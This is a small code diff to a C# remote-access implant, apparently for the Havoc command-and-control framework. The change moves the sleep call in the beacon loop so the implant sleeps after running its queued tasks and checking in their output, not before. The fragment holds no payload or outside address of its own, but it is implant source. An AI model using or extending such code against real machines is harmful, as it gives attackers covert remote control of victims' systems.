@@ -132,7 +132,6 @@ namespace HavocImplant
                         
                     }
                 }
-                Thread.Sleep(implant.sleepTime);
                 string cumalativeOutput = "";
 
                 for (int i = 0; i < implant.taskingInformation.Count; i++)
@@ -147,6 +146,7 @@ namespace HavocImplant
                     }
                 }
                 Comms.CheckIn(implant, cumalativeOutput, "commandoutput");
+                Thread.Sleep(implant.sleepTime);
             }
         }
         public static async Task HandleCommand(task Task, int taskId)
